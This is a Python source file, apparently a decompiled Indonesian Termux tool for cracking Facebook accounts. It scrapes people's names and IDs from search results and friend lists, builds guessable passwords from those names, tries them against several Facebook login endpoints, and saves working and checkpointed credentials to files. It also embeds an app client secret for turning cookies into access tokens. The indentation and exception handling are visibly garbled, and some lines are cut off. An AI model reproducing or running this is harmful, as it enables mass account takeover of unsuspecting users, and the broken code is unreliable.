"""
gatau punya siapa
"""

import os
import sys
import re
import time
import json
import random
import requests
import uuid
import hmac
import hashlib
import urllib
import threading
import bs4
import rich
from rich.panel import Panel
from rich.tree import Tree
from rich.console import Console
from rich.columns import Columns
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as parser
from base64 import b64encode, b64decode
console = Console()
session = requests.Session()
threads = []

class TERMINAL:
    def __init__(self):
        self.clear = lambda: os.system('clear')

    def BANNER(self):
        self.clear()
        console.print('[bold red]___________                                         .__     \n\\_   _____/____    ____  ____   _____ _____    _____|  |__  \n |    __) \\__  \\ _/ ___\\/ __ \\ /     \\\\__  \\  /  ___/  |  \\ \n |     \\   / __ \\  \\__\\  ___/|  Y Y  \\/ __ \\_\\___ \\|   Y   \\\n[bold white] \\___  /  (____  /\\___  >___  >__|_|  (____  /____  >___|  /\n     \\/        \\/     \\/    \\/      \\/     \\/     \\/     \\/ \n  [bold white]|| Author :[bold green] @LeviaXD[bold white] || Version :[bold red] 3.8[bold white] || Type :[bold green] Premium[bold white] ||')

    def TERMINAL_SIZE(self):
        try:
            terminal_size = os.get_terminal_size()
            if terminal_size.columns <= 100 or terminal_size.lines <= 25:
                console.print('[bold red]Anda Harus Mengecilkan Tampilan Layar Di Termux, Cara Mengeci\nlkan Anda Bisa Menggunakan Dua Jari Lalu Cubit Secara Bersamaan, Silahkan Kecilkan Tampilan Termux Sampai Maksimum Panel Ini Terlihat Rapi!')
                sys.exit()
        except Exception as e:
            return None
        else:  
            pass

    def CHECK_FLODER(self):
        try:
            os.mkdir('Temporary')
        except:
            return

    def CHECK_IP(self, headers=None):
        if headers is None:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'}
        try:
            response = requests.get('https://ipinfo.io/json', headers=headers).json()
            return response.get('ip')
        except:
            return '[bold red]?'

    def ANTI_WIFI(self):
        try:
            if os.popen('ip neigh show').read().split():
                console.print('[bold red]Anda Terdeteksi Menggunakan WiFi, Harap Di Ingat Menggunakan Jaringan Selain Data Selular Menyebabkan Kesalahan, Harap Matikan Tipe Koneksi:\nHotspot Pribadi, WiFi, Bluetooth, VPN, dan Proxy!')
                sys.exit()
        except:
            return

class LOGIN:
    def __init__(self):
        self.terminal = TERMINAL()
        self.free = []

    def COOKIES(self, cookie):
        try:
            cookie_dict = {}
            for item in cookie.split(';'):
                if '=' in item:
                    key, value = item.split('=', 1)
                    cookie_dict[key.strip()] = value.strip()
                else:  
                    cookie_dict[item.strip()] = ''
            user_id = cookie_dict.get('c_user')
            headers = {'authority': 'business.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-GB,en;q=0.9', 'cache-control': 'max-age=0', 'cookie': cookie, 'sec-ch-ua': '\"Google Chrome\";v=\"117\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"117\"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '\"Windows\"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36'}
            response = requests.get('https://business.facebook.com/business/login/', headers=headers)
            if 'checkpoint' in response.url or 'checkpoint' in response.text:
                console.print('[bold red]Sepertinya Akun Facebook Anda Terkena Checkpoint, Silahkan Dapatkan Cookies Ulang dan Pastikan Akun Facebook Aman!')
                sys.exit()
                return user_id
            if 'c_user' not in cookie:
                console.print('[bold red]Sepertinya Cookies Akun Facebook Anda Sudah Tidak Berfungsi, Ini Terjadi Karena Akun Facebook Anda\nTidak Dalam Keadaan Login atau Akun Terblokir Sementara!')
                sys.exit()
            return user_id
        except Exception as e:
            console.print('[bold red]KONEKSI ERROR!')
            sys.exit()

    def UBAH_MENJADI_TOKEN(self, cookie):
        try:
            headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'cookie': cookie}
            response = requests.get('https://business.facebook.com/business/login/', headers=headers)
            fb_dtsg = re.search('\"LSD\",\\[\\],{\"token\":\"(.*?)\"', response.text)
            if fb_dtsg:
                fb_dtsg = fb_dtsg.group(1)
            else:  
                fb_dtsg = re.search('\"lsd\" value=\"(.*?)\"', response.text)
                if fb_dtsg:
                    fb_dtsg = fb_dtsg.group(1)
                else:  
                    console.print('[bold red]LSD TOKEN NOT FOUND!')
                    sys.exit()
            jazoest = re.search('jazoest=(\\d+)', response.text)
            if jazoest:
                jazoest = jazoest.group(1)
            else:  
                jazoest = '22830'
            data = {'jazoest': jazoest, 'fb_dtsg': fb_dtsg, 'grant_type': 'fb_exchange_token', 'client_id': '438142079694454', 'client_secret': '8f93ade1cbf3cc1bebb1a5b8f26de196', 'fb_exchange_token': cookie}
            response = requests.post('https://business.facebook.com/business/login/access-token/dialog/oauth/confirm/', headers=headers, data=data)
            access_token = re.search('\"access_token\":\"(.*?)\"', response.text)
            if access_token:
                access_token = access_token.group(1)
                return access_token
            console.print('[bold red]Token dari Cookies Tersebut Tidak Ditemukan, Ada Kemungkinan Akun Facebook Terkena Checkpoint atau Akun Tidak Suport!')
            sys.exit()
            return
        except Exception as e:
            console.print('[bold red]KONEKSI ERROR!')
            sys.exit()
            return None
        else:  
            pass

    def MENDAPATKAN_AKUN_SAYA(self, cookie):
        try:
            headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'cookie': cookie}
            response = requests.get('https://web.facebook.com/profile.php', headers=headers)
            soup = parser(response.text, 'html.parser')
            account_info = re.search('{\"ACCOUNT_ID\":\"(\\d+)\",\"USER_ID\":\".*?\",\"NAME\":\"(.*?)\"}', response.text)
            if account_info:
                user_id = account_info.group(1)
                user_name = account_info.group(2)
                return {'id': user_id, 'name': user_name}
            console.print('[bold red]INVALID JSON FORMAT OR SYNTAX ERROR!')
            sys.exit()
        except Exception as e:
            console.print('[bold red]KONEKSI ERROR!')
            sys.exit()
            return None
        else:  
            pass

    def AKUN_SAYA(self, cookie, token):
        try:
            params = {'access_token': token}
            response = requests.get('https://graph.facebook.com/v18.0/me/', params=params).json()
            user_info = self.MENDAPATKAN_AKUN_SAYA(cookie)
            me = {'id': response.get('id', user_info['id']), 'name': response.get('name', user_info['name']), 'first_name': response.get('first_name', ''), 'middle_name': response.get('middle_name', ''), 'last_name': response.get('last_name', ''), 'link': response.get('link', f"https://facebook.com/{response.get('id', '')}"), 'username': response.get('username', ''), 'birthday': response.get('birthday', ''), 'gender': response.get('gender', ''), 'email': response.get('email', ''), 'timezone': response.get('timezone', ''), 'locale': response.get('locale',
            return me
        except Exception as e:
            console.print('[bold red]KONEKSI ERROR!')
            sys.exit()

    def JUMLAH_PENGGUNA(self, cookie, user_id):
        try:
            headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'cookie': cookie}
            response = requests.get(f'https://web.facebook.com/profile.php?id={user_id}&sk=friends_all', headers=headers)
            total_friends = re.search('onlineText\\\":\\\"(\\d+)', response.text)
            if total_friends:
                total_friends = total_friends.group(1)
            else:  
                total_friends = '0'
            response = requests.get(f'https://web.facebook.com/profile.php?id={user_id}&sk=followers', headers=headers)
            total_followers = re.search('viewsText\\\":\\\"(.*?)\\\"', response.text)
            if total_followers:
                total_followers = total_followers.group(1).replace('.', '')
            else:  
                total_followers = '0'
            return {'friends': total_friends, 'followers': total_followers}
        except Exception as e:
            return {'friends': '0', 'followers': '0'}
        else:  
            pass

    def MENDAPATKAN_PROVIDER(self, provider):
        providers = {'TELKOMSEL': ['0811', '0812', '0813', '0821', '0822', '0823', '0852', '0853', '0851'], 'XL': ['0817', '0818', '0819', '0859', '0877', '0878', '0831'], 'INDOSAT': ['0814', '0815', '0816', '0855', '0856', '0857', '0858'], 'TRI': ['0895', '0896', '0897', '0898', '0899'], 'SMARTFREN': ['0881', '0882', '0883', '0884', '0885', '0886', '0887', '0888', '0889'], 'AXIS': ['0838', '0831', '0832', '0833'], 'BY.U': ['0851']}
        return providers.get(provider, [])

class CRACK:
    def __init__(self):
        self.ok = []
        self.cp = []
        self.loop = 0

    def GENERATE_PASSWORD(self, name):
        first_name = name.split()[0].lower()
        passwords = [first_name, first_name + '123', first_name + '1234', first_name + '12345', first_name + '123456', name.lower(), name.lower().replace(' ', ''), name.lower().replace(' ', '') + '123', name.lower().replace(' ', '') + '1234', name.lower().replace(' ', '') + '12345', name.lower().replace(' ', '') + '123456']
        return passwords

    def METODE(self, username, password_list, cookie):
        self.loop += 1
        sys.stdout.write(f'\r[bold white] CP:-[bold red]{len(self.cp)} [bold white] OK:-[bold green]{len(self.ok)} [bold white] {self.loop}/{len(username)} ')
        sys.stdout.flush()
        for password in password_list:
            try:
                if not self.MOBILE_ADS_MANAGER_ANDROID(username, password, cookie) and (not self.MESSENGER(username, password, cookie)) and (not self.WEB_REGULAR(username, password, cookie)) and (not self.MOBILE_BUSINESS(username, password, cookie)):
                    self.MESSENGER_APPS_ANDROID(username, password, cookie)
            except Exception as e:
                pass  
            pass

    def ENCRYPT_PASSWORD_REACTNATIVE(self, password, key_id, pub_key):
        try:
            from Crypto.PublicKey import RSA
            from Crypto.Cipher import PKCS1_v1_5
            import base64
            pubkey = RSA.importKey(base64.b64decode(pub_key))
            cipher = PKCS1_v1_5.new(pubkey)
            encrypted = cipher.encrypt(password.encode('utf-8'))
            encrypted_password = base64.b64encode(encrypted).decode('utf-8')
            return f'#PWD_REACTNATIVE:2:{{key_id}}:{{encrypted_password}}'
        except:
            return '#PWD_REACTNATIVE:0:{}:{}'

    def ENCRYPT_PASSWORD_BROWSER(self, password, key_id, pub_key):
        try:
            from Crypto.PublicKey import RSA
            from Crypto.Cipher import PKCS1_v1_5
            import base64
            pubkey = RSA.importKey(base64.b64decode(pub_key))
            cipher = PKCS1_v1_5.new(pubkey)
            encrypted = cipher.encrypt(password.encode('utf-8'))
            encrypted_password = base64.b64encode(encrypted).decode('utf-8')
            return f'#PWD_BROWSER:5:{key_id}:{encrypted_password}'
        except:
            return f'#PWD_BROWSER:0:{key_id}:{password}'

    def MOBILE_ADS_MANAGER_ANDROID(self, username, password, cookie):
        try:
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            headers = {'User-Agent': '[FBAN/MobileAdsManagerAndroid;FBAV/420.0.0.75.109;FBBV/714077752;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/id_ID;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi Note 8;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1456};FB_FW/1;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Connection-Quality': 'EXCELLENT', 'X-FB-Connection-Type': 'WIFI', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Request-Analytics-Tags': 'unknown'}
            response = requests.get(f'https://graph.facebook.com/pwd_key_fetch?access_token=438142079694454%7Cfc0a7caa49b192f64f6f5a6d9643bb28&device_id={device_id}&version=2', headers=headers).json()
            key_id = response.get('keyId')
            pub_key = response.get('publicKey')
            if not key_id or not pub_key:
                return False
            encrypted_pass = self.ENCRYPT_PASSWORD_REACTNATIVE(password, key_id, pub_key)
            data = {'adid': adid, 'format': 'json', 'device_id': device_id, 'email': username, 'password': encrypted_pass, 'cpl': 'true', 'family_device_id': device_id, 'secure_family_device_id': device_id, 'credentials_type': 'password', 'error_detail_type': 'button_with_disabled', 'source': 'account_recovery', 'generate_session_cookies': '1', 'generate_analytics_claim': '1', 'generate_machine_id': '1', 'tier': 'regular', 'device': 'SM-G935F', 'device_id': device_id, 'ID': {'network_country_iso': adid, 'advertiser_id': 'id_ID'}}
            response = requests.post('https://graph.facebook.com/auth/login', data=data, headers=headers)
            if 'session_key' in response.text:
                self.ok.append(f'{username}|{password}')
                with open('Temporary/Ok.txt', 'a') as f:
                    pass  
        except Exception as e:
                    f.write(f'{username}|{password}\n')
            else:  
                if 'checkpoint' in response.text:
                    self.cp.append(f'{username}|{password}')
                    with open('Temporary/Cp-', 'a') as f:
                        f.write(f'{username}|{password}\n')
                            return True
                return False

    def MESSENGER(self, username, password, cookie):
        try:
            session = requests.Session()
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Language': 'en-US,en;q=0.9', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1'}
            response = session.get('https://www.messenger.com/login/', headers=headers)
            if 'facebook.com/checkpoint' in response.url:
                return False
            jazoest = re.search('name=\"jazoest\" value=\"(\\d+)\"', response.text)
            lsd = re.search('name=\"lsd\" value=\"(.*?)\"', response.text)
            if not jazoest or not lsd:
                return False
        except Exception as e:
            pass  
        else:  
            jazoest = jazoest.group(1)
            lsd = lsd.group(1)
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            data = {'jazoest': jazoest, 'lsd': lsd, 'email': username, 'pass': password, 'login': '1', 'persistent': '1'}
            response = session.post('https://www.messenger.com/login/password/', headers=headers, data=data, allow_redirects=True)
            if 'c_user' in session.cookies:
                self.ok.append(f'{username}|{password}')
                with open('Temporary/Ok.txt', 'a') as f:
                    f.write(f'{username}|{password}\n')
            else:  
                if 'checkpoint' in response.url or 'checkpoint' in session.cookies:
                    self.cp.append(f'{username}|{password}')
                    with open('Temporary/Cp-', 'a') as f:
                        f.write(f'{username}|{password}\n')
                            return True
                else:  
                    return False
                return False

    def MESSENGER_APPS_ANDROID(self, username, password, cookie):
        try:
            session = requests.Session()
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            headers = {'User-Agent': '[FBAN/Orca-Android;FBAV/486.0.0.127.109;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/714077752;FBCR/Indosat;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi Note 8;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1456};FB_FW/1;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'b-graph.facebook.com', 'X-FB-Connection-Quality': 'EXCELLENT', 'X-FB-Connection-Type': 'WIFI', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Request-Analytics-Tags': 'unknown'}
            response = requests.get(f'https://graph.facebook.com/pwd_key_fetch?access_token=438142079694454%7Cfc0a7caa49b192f64f6f5a6d9643bb28&device_id={device_id}&version=2', headers=headers).json()
            key_id = response.get('keyId')
            pub_key = response.get('publicKey')
            if not key_id or not pub_key:
                return False
            encrypted_pass = self.ENCRYPT_PASSWORD_REACTNATIVE(password, key_id, pub_key)
            data = {'adid': adid, 'format': 'json', 'device_id': device_id, 'email': username, 'password': encrypted_pass, 'cpl': 'true', 'family_device_id': device_id, 'secure_family_device_id': device_id, 'credentials_type': 'password', 'error_detail_type': 'button_with_disabled', 'source': 'login', 'generate_session_cookies': '1', 'generate_analytics_claim': '1', 'generate_machine_id': '1', 'tier': 'regular', 'device': 'SM-G935F', 'device_id': device_id, **{'advertiser_id': adid, 'locale': 'id_ID'}}
            response = requests.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers)
            if 'session_key' in response.text:
                self.ok.append(f'{username}|{password}')
                with open('Temporary/Ok.txt', 'a') as f:
                    pass  
        except Exception as e:
                    f.write(f'{username}|{password}\n')
            else:  
                if 'checkpoint' in response.text:
                    self.cp.append(f'{username}|{password}')
                    with open('Temporary/Cp-', 'a') as f:
                        f.write(f'{username}|{password}\n')
                            return True
                return False

    def WEB_REGULAR(self, username, password, cookie):
        try:
            session = requests.Session()
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Language': 'en-US,en;q=0.9', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1'}
            response = session.get('https://web.facebook.com/login/device-based/regular/login/', headers=headers)
            if 'facebook.com/checkpoint' in response.url:
                return False
            jazoest = re.search('name=\"jazoest\" value=\"(\\d+)\"', response.text)
            lsd = re.search('name=\"lsd\" value=\"(.*?)\"', response.text)
            if not jazoest or not lsd:
                return False
        except Exception as e:
            pass  
        else:  
            jazoest = jazoest.group(1)
            lsd = lsd.group(1)
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            data = {'jazoest': jazoest, 'lsd': lsd, 'email': username, 'pass': password, 'login': '1', 'persistent': '1'}
            response = session.post('https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110', headers=headers, data=data, allow_redirects=True)
            if 'c_user' in session.cookies:
                self.ok.append(f'{username}|{password}')
                with open('Temporary/Ok.txt', 'a') as f:
                    f.write(f'{username}|{password}\n')
            else:  
                if 'checkpoint' in response.url or 'checkpoint' in session.cookies:
                    self.cp.append(f'{username}|{password}')
                    with open('Temporary/Cp-', 'a') as f:
                        f.write(f'{username}|{password}\n')
                            return True
                else:  
                    return False
                return False

    def MOBILE_BUSINESS(self, username, password, cookie):
        try:
            session = requests.Session()
            headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Language': 'en-US,en;q=0.9', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1'}
            response = session.get('https://business.facebook.com/login/device-based/regular/login/', headers=headers)
            if 'facebook.com/checkpoint' in response.url:
                return False
            jazoest = re.search('name=\"jazoest\" value=\"(\\d+)\"', response.text)
            lsd = re.search('name=\"lsd\" value=\"(.*?)\"', response.text)
            if not jazoest or not lsd:
                return False
        except Exception as e:
            pass  
        else:  
            jazoest = jazoest.group(1)
            lsd = lsd.group(1)
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            response = requests.get('https://business.facebook.com/business/loginpage/?cma_account_switch=true&login_options[0]=SSO&login_options[1]=FB&next=https%3A%2F%2Fdevelopers.facebook.com%2Fapps%2F', headers=headers)
            key_data = re.search('{\"pubKey\":{\"publicKey\":\"(.*?)\",\"keyId\":(\\d+)}}', response.text)
            if key_data:
                pub_key = key_data.group(1)
                key_id = key_data.group(2)
                encrypted_pass = self.ENCRYPT_PASSWORD_BROWSER(password, key_id, pub_key)
            else:  
                encrypted_pass = password
            data = {'jazoest': jazoest, 'lsd': lsd, 'email': username, 'pass': encrypted_pass, 'login': '1', 'persistent': '1'}
            response = session.post('https://business.facebook.com/login/device-based/regular/login/', headers=headers, data=data, allow_redirects=True)
            if 'c_user' in session.cookies:
                self.ok.append(f'{username}|{password}')
                with open('Temporary/Ok.txt', 'a') as f:
                    f.write(f'{username}|{password}\n')
            else:  
                if 'checkpoint' in response.url or 'checkpoint' in session.cookies:
                    self.cp.append(f'{username}|{password}')
                    with open('Temporary/Cp-', 'a') as f:
                        f.write(f'{username}|{password}\n')
                return False

class GENERATE:
    def __init__(self):
        self.ua_xiaomi = []
        self.ua_nokia = []
        self.ua_asus = []
        self.ua_huawei = []
        self.ua_vivo = []
        self.ua_oppo = []
        self.ua_samsung = []
        self.ua_realme = []
        self.ua_lenovo = []
        self.ua_oneplus = []
        self.ua_infinix = []
        self.ua_mito = []
        self.ua_sony = []
        self.ua_advan = []
        self.ua_iphone = []
        self.ua_evercoss = []
        self.ua_poco = []
        self.ua_nokia = []

    def ANDROID_USERAGENT(self, brand='all'):
        brands = {'xiaomi': self.ua_xiaomi, 'nokia': self.ua_nokia, 'asus': self.ua_asus, 'huawei': self.ua_huawei, 'vivo': self.ua_vivo, 'oppo': self.ua_oppo, 'samsung': self.ua_samsung, 'realme': self.ua_realme, 'lenovo': self.ua_lenovo, 'oneplus': self.ua_oneplus, 'infinix': self.ua_infinix, 'mito': self.ua_mito, 'sony': self.ua_sony, 'advan': self.ua_advan, 'iphone': self.ua_iphone, 'evercoss': self.ua_evercoss, 'poco': self.ua_poco}
        if brand.lower() == 'all':
            all_brands = []
            for brand_ua in brands.values():
                all_brands.extend(brand_ua)
            if all_brands:
                return random.choice(all_brands)
            return self.DEFAULT_UA()
        else:  
            selected_brands = []
            for b in brand.lower().split(','):
                if b.strip() in brands:
                    selected_brands.extend(brands[b.strip()])
            return random.choice(selected_brands) if selected_brands else self.DEFAULT_UA()

    def ADS_MANAGER_USERAGENT(self, brand='all'):
        base_ua = '[FBAN/MobileAdsManagerAndroid;FBAV/420.0.0.75.109;FBBV/714077752;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/id_ID;FBMF/{};FBBD/{};FBDV/{};FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{{density=2.0,width=720,height=1456}};FB_FW/1;]'
        oppo = {'xiaomi': ['Redmi Note 8', 'Redmi Note 9', 'Mi 10', 'Mi 11', 'POCO X3'], 'samsung': ['SM-G935F', 'SM-A205F', 'SM-A505F', 'SM-A515F', 'SM-A715F'], 'oppo': ['A54', 'F19', 'Reno5', 'A96', 'F21 Pro'], 'vivo': ['V21', 'Y73', 'X60', 'V20', 'Y20'], 'realme': ['8 Pro', '9 Pro', 'GT Neo3', 'C25', 'X7 Max'], 'infinix': ['Hot 11', 'Note 10', 'Zero 8', 'Hot 10', 'Note 8'], 'asus': ['ZenFone 8', 'ROG Phone 5', 'ZenFone 7', 'ZenFone Max Pro M2', 'ROG Phone 3'], 'poco': ['POCO F3', 'POCO X3 Pro', 'POCO M3', 'POCO F4', '
        if brand.lower() == 'all':
            all_brands = []
            for brand_name, models in device_models.items():
                for model in models:
                    all_brands.append(base_ua.format(brand_name, brand_name, model))
            return random.choice(all_brands)
        else:  
            selected_uas = []
            for b in brand.lower().split(','):
                if b.strip() in device_models:
                    for model in device_models[b.strip()]:
                        selected_uas.append(base_ua.format(b.strip().title(), b.strip().title(), model))
            if selected_uas:
                return random.choice(selected_uas)
            return self.DEFAULT_UA()

    def DEFAULT_UA(self):
        return 'Mozilla/5.0 (Linux; Android 10; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36'

class DUMPS_GRAPHQL:
    def __init__(self, cookie, token):
        self.cookie = cookie
        self.token = token
        self.user_id = re.search('c_user=(\\d+)', cookie).group(1) if re.search('c_user=(\\d+)', cookie) else None

    def GET_QUERY_COUNT(self, search, cookie):
        try:
            headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'cookie': cookie}
            params = {'q': search}
            response = requests.get('https://web.facebook.com/search/people', params=params, headers=headers)
            total_users = re.findall('text\":\"(.*?)\"},\"uri\":\"https:\\\\/\\\\/web.facebook.com\\\\/.*?\\\\/friends\\\\/\"', response.text)
            return len(total_users)
        except Exception as e:
            return 0 + (None, e)
        else:  
            pass

    def NEXT_CURSOR_QUERY(self, search, cursor, cookie):
        try:
            headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'cookie': cookie, 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'content-type': 'application/x-www-form-urlencoded'}
            response = requests.get('https://web.facebook.com/search/people/?q=' + search, headers=headers)
            fb_dtsg = re.search('\"dtsg\":{\"token\":\"(.*?)\"', response.text).group(1)
            lsd = re.search('\"LSD\",\\[\\],{\"token\":\"(.*?)\"', response.text).group(1)
            variables = {'count': 8, 'cursor': cursor}
            data = {'fb_dtsg': fb_dtsg, 'lsd': lsd, 'variables': json.dumps(variables), 'doc_id': '9836020469887924'}
            response = requests.post('https://web.facebook.com/api/graphql/', headers=headers, data=data)
            result = response.json()
            users = []
            if result.get('data', {}).get('viewer', {}).get('search_results', {}).get('edges', []):
                for edge in result['data']['viewer']['search_results']['edges']:
                    node = edge.get('node', {})
                    if node.get('__typename') == 'User':
                        user_id = node.get('id', '')
                        name = node.get('name', '')
                        url = node.get('url', '')
                        username = re.search('facebook\\.com/(.*?)(?:\\?|$)', url)
                        username = username.group(1) if username else ''
                        if user_id and name:
                            pass  
        except Exception as e:
                        else:  
                            users.append({'id': user_id, 'name': name, 'username': username})
            next_cursor = None
            if result.get('data', {}).get('viewer', {}).get('search_results', {}).get('page_info', {}).get('end_cursor'):
                next_cursor = result['data']['viewer']['search_results']['page_info']['end_cursor']
            return {'users': users, 'cursor': next_cursor}
                    return {'users': [], 'cursor': None}

    def GET_FRIENDS_COUNT(self, user_id, cookie):
        try:
            headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'cookie': cookie}
            response = requests.get(f'https://web.facebook.com/profile.php?id={user_id}&sk=friends_all', headers=headers)
            friend_count = re.search('onlineText\":\"(\\d+)', response.text)
            if friend_count:
                return int(friend_count.group(1))
        except Exception as e:
            pass  
        else:  
            pass  
        return 0
            return 0 + (None, e)
        else:  
            pass

    def NEXT_CURSOR_FRIENDS(self, user_id, cursor, cookie):
        try:
            headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'cookie': cookie, 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'content-type': 'application/x-www-form-urlencoded'}
            response = requests.get(f'https://web.facebook.com/profile.php?id={user_id}&sk=friends_all', headers=headers)
            fb_dtsg = re.search('\"dtsg\":{\"token\":\"(.*?)\"', response.text).group(1)
            lsd = re.search('\"LSD\",\\[\\],{\"token\":\"(.*?)\"', response.text).group(1)
            profile_id = user_id
            variables = {'count': 8, 'cursor': cursor, 'id': profile_id}
            data = {'fb_dtsg': fb_dtsg, 'lsd': lsd, 'variables': json.dumps(variables), 'doc_id': '8099805550031186'}
            response = requests.post('https://web.facebook.com/api/graphql/', headers=headers, data=data)
            result = response.json()
            friends = []
            if result.get('data', {}).get('node', {}).get('friends', {}).get('edges', []):
                for edge in result['data']['node']['friends']['edges']:
                    node = edge.get('node', {})
                    user_id = node.get('id', '')
                    name = node.get('name', '')
                    url = node.get('url', '')
                    username = re.search('facebook\\.com/(.*?)(?:\\?|$)', url)
                    username = username.group(1) if username else ''
                    if user_id and name:
                        pass  
        except Exception as e:
                    else:  
                        friends.append({'id': user_id, 'name': name, 'username': username})
            next_cursor = None
            if result.get('data', {}).get('node', {}).get('friends', {}).get('page_info', {}).get('end_cursor'):
                next_cursor = result['data']['node']['friends']['page_info']['end_cursor']
            return {'friends': friends, 'cursor': next_cursor}
                    return {'friends': [], 'cursor': None}

    def GET_FOLLOWERS_COUNT(self, user_id, cookie):
        try:
            headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'cookie': cookie}
            response = requests.get(f'https://web.facebook.com/profile.php?id={user_id}&sk=followers', headers=headers)
            follower_count = re.search('viewsText\":\"(.*?)\"', response.text)
            if follower_count:
                count_text = follower_count.group(1)
                if 'K' in count_text:
                    return int(float(count_text.replace('K', '')) * 1000)
                if 'M' in count_text:
                    return int(float(count_text.replace('M', '')) * 1000000)
        except Exception as e:
            else:  
                return int(count_text.replace('.', '').replace(',', ''))
            else:  
                return 0
                return 0 + (None, e)
            else:  
                pass

    def NEXT_CURSOR_FOLLOWERS(self, user_id, cursor, cookie):
        try:
            headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'cookie': cookie, 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'content-type': 'application/x-www-form-urlencoded'}
